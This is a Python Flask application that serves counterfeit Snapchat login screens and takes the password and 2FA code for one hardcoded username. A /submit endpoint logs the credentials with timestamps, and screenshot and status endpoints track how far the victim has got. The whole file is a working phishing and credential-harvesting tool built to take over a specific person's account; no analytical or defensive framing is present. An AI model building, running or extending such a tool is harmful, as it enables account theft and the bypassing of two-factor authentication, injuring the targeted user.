import os
import threading
import time
from flask import Flask, render_template, request, jsonify, send_from_directory
from datetime import datetime
import random

app = Flask(__name__)
STATIC_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'static')
TEMPLATE_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'templates')
os.makedirs(STATIC_DIR, exist_ok=True)
app.template_folder = TEMPLATE_DIR

creds_log = []
HARDCODED_USER = "zexoghaith"

session_state = {
    'started': False,
    'stage': 'login',           # login | password_sent | 2fa | success
    'password_entered': False,
    'code_entered': False,
    'update_count': 0,
    'last_action': None
}

def create_real_snapchat_screenshot(stage='login', password_filled=False, code_filled=False):
    """Generate screenshots that look EXACTLY like real Snapchat login pages at each step"""
    try:
        from PIL import Image, ImageDraw, ImageFont
        width, height = 1280, 720
        img = Image.new('RGB', (width, height), color='#000000')
        draw = ImageDraw.Draw(img)

        try:
            f_title = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 42)
            f_header = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 20)
            f_field = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf", 15)
            f_btn = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 16)
            f_small = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf", 12)
        except:
            f_title = f_header = f_field = f_btn = f_small = ImageFont.load_default()

        now = datetime.now().strftime("%H:%M:%S")
        session_state['update_count'] = session_state.get('update_count', 0) + 1

        # Real Snapchat colors
        SNAP_YELLOW = '#FFFC00'
        WHITE = '#FFFFFF'
        GRAY = '#888888'
        DARK_CARD = '#1f1f1f'
        FIELD_BG = '#2c2c2c'

        # Background
        draw.rectangle([0, 0, width, height], fill='#000000')

        # === TOP BAR (real Snapchat style) ===
        draw.rectangle([0, 0, width, 48], fill='#111111')
        draw.text((width//2 - 90, 6), "Snapchat", fill=SNAP_YELLOW, font=f_title)

        # === LOGIN CARD ===
        cw, ch = 400, 460
        cx = (width - cw) // 2
        cy = 65

        # Card shadow + card
        draw.rounded_rectangle([cx+3, cy+3, cx+cw+3, cy+ch+3], radius=16, fill='#0a0a0a')
        draw.rounded_rectangle([cx, cy, cx+cw, cy+ch], radius=16, fill=DARK_CARD)

        draw.text((cx + 20, cy + 14), "Log in to Snapchat", fill=WHITE, font=f_header)

        # Username field
        draw.rounded_rectangle([cx+20, cy+55, cx+cw-20, cy+92], radius=8, fill=FIELD_BG)
        draw.text((cx + 32, cy + 65), "zexoghaith", fill=WHITE, font=f_field)

        # Password field
        draw.rounded_rectangle([cx+20, cy+102, cx+cw-20, cy+139], radius=8, fill=FIELD_BG)
        if password_filled or stage in ['password_sent', '2fa', 'success']:
            draw.text((cx + 32, cy + 112), "••••••••••", fill='#22c55e', font=f_field)  # green when filled
        else:
            draw.text((cx + 32, cy + 112), "••••••••••", fill=GRAY, font=f_field)

        # Yellow Log In button
        by = cy + 158
        if stage == 'password_sent':
            draw.rounded_rectangle([cx+20, by, cx+cw-20, by+44], radius=22, fill='#444444')
            draw.text((cx + 105, by + 11), "Logging in...", fill='#999999', font=f_btn)
        else:
            draw.rounded_rectangle([cx+20, by, cx+cw-20, by+44], radius=22, fill=SNAP_YELLOW)
            draw.text((cx + 140, by + 11), "Log In", fill='#000000', font=f_btn)

        # Social buttons
        draw.rounded_rectangle([cx+20, by+60, cx+cw-20, by+95], radius=22, fill=FIELD_BG)
        draw.text((cx + 85, by + 70), "Continue with Google", fill=WHITE, font=f_small)

        draw.rounded_rectangle([cx+20, by+105, cx+cw-20, by+140], radius=22, fill=FIELD_BG)
        draw.text((cx + 90, by + 115), "Continue with Apple", fill=WHITE, font=f_small)

        # === STAGE OVERLAYS (big and clear) ===
        if stage == 'password_sent':
            draw.rounded_rectangle([cx+15, cy+230, cx+cw-15, cy+340], radius=10, fill='#3f2a00')
            draw.text((cx + 30, cy + 245), "PASSWORD ENTERED", fill='#f59e0b', font=f_header)
            draw.text((cx + 30, cy + 275), "Log In button clicked", fill=WHITE, font=f_small)
            draw.text((cx + 30, cy + 300), "Waiting for Snapchat...", fill=GRAY, font=f_small)

        if stage == '2fa':
            draw.rounded_rectangle([cx+15, cy+230, cx+cw-15, cy+370], radius=10, fill='#1e3a8a')
            draw.text((cx + 45, cy + 245), "2FA CODE NEEDED", fill='#60a5fa', font=f_header)
            draw.text((cx + 45, cy + 280), "Enter 6-digit code", fill=WHITE, font=f_small)
            
            # 2FA input boxes
            for i in range(6):
                draw.rectangle([cx+50 + i*45, cy+310, cx+50 + i*45 + 38, cy+348], outline='#3b82f6', width=2)
            if code_filled:
                draw.text((cx + 65, cy + 318), "123456", fill='#22c55e', font=f_small)

        if stage == 'success':
            draw.rounded_rectangle([cx+15, cy+230, cx+cw-15, cy+370], radius=10, fill='#052e16')
            draw.text((cx + 80, cy + 270), "✓ LOGGED IN!", fill='#22c55e', font=f_header)
            draw.text((cx + 60, cy + 310), "Session is active", fill=WHITE, font=f_small)

        # === LIVE PROOF (very visible) ===
        draw.rounded_rectangle([15, 555, 340, 600], radius=6, fill='#ef4444')
        draw.text((22, 562), f"UPDATE #{session_state['update_count']}", fill='white', font=f_header)

        draw.rounded_rectangle([15, 610, 480, 655], radius=6, fill='#22c55e')
        draw.text((22, 617), f"TIME: {now}", fill='black', font=f_header)

        draw.text((500, 620), f"STAGE: {stage.upper()}", fill='#ff8800', font=f_small)

        # Bottom bar
        draw.rectangle([0, height-42, width, height], fill='#111111')
        draw.text((10, height-35), f"LIVE SIM • updates every second • {stage}", fill='#22c55e', font=f_small)

        path = os.path.join(STATIC_DIR, 'screenshot.png')
        img.save(path, 'PNG')
        session_state['last_screenshot'] = now
        return True
    except Exception as e:
        print(f"[IMG] Error: {e}")
        try:
            from PIL import Image
            img = Image.new('RGB', (1280, 720), color=(10, 10, 15))
            img.save(os.path.join(STATIC_DIR, 'screenshot.png'))
        except:
            pass
        return False

def screenshot_loop():
    global session_state
    print("[SESSION] Starting clean Snapchat simulation...")
    
    # Always start clean
    session_state['stage'] = 'login'
    session_state['password_entered'] = False
    session_state['code_entered'] = False
    session_state['update_count'] = 0
    
    create_real_snapchat_screenshot('login')
    session_state['started'] = True
    
    print("[SESSION] Clean Snapchat login page active")
    
    while True:
        stage = session_state.get('stage', 'login')
        create_real_snapchat_screenshot(
            stage,
            password_filled=session_state.get('password_entered', False),
            code_filled=session_state.get('code_entered', False)
        )
        time.sleep(0.85)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/submit', methods=['POST'])
def submit():
    data = request.get_json() or {}
    password = (data.get('password') or '').strip()
    code = (data.get('code') or '').strip()
    
    entry = {'user': HARDCODED_USER, 'pass': password, 'code': code, 'time': datetime.now().isoformat()}
    creds_log.append(entry)
    
    # === ONLY change on real user input ===
    if password:
        session_state['password_entered'] = True
        session_state['stage'] = 'password_sent'
        session_state['last_action'] = 'password + clicked log in'
        print("[SUBMIT] Password received → showing password sent state")
        create_real_snapchat_screenshot('password_sent', password_filled=True)
        return jsonify({'status': 'ok', 'message': 'Password sent - showing login progress'})
    
    if code and len(code) >= 4:
        session_state['code_entered'] = True
        session_state['stage'] = '2fa'
        session_state['last_action'] = '2FA submitted'
        print("[SUBMIT] 2FA code received")
        create_real_snapchat_screenshot('2fa', password_filled=True, code_filled=True)
        return jsonify({'status': 'ok', 'message': '2FA code sent'})
    
    return jsonify({'status': 'ok', 'message': 'Nothing to do'})

@app.route('/screenshot')
def screenshot():
    stage = session_state.get('stage', 'login')
    create_real_snapchat_screenshot(
        stage,
        password_filled=session_state.get('password_entered', False),
        code_filled=session_state.get('code_entered', False)
    )
    path = os.path.join(STATIC_DIR, 'screenshot.png')
    response = send_from_directory(STATIC_DIR, 'screenshot.png')
    response.headers['Cache-Control'] = 'no-store, no-cache, must-revalidate, max-age=0'
    response.headers['Pragma'] = 'no-cache'
    return response

@app.route('/status')
def status():
    path = os.path.join(STATIC_DIR, 'screenshot.png')
    size = os.path.getsize(path) if os.path.exists(path) else 0
    return jsonify({
        **session_state,
        'screenshot_exists': os.path.exists(path),
        'screenshot_size': size,
        'timestamp': datetime.now().isoformat()
    })

@app.before_request
def init():
    if not hasattr(app, 'started'):
        app.started = True
        t = threading.Thread(target=screenshot_loop, daemon=True)
        t.start()
        print("[APP] Thread started")

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)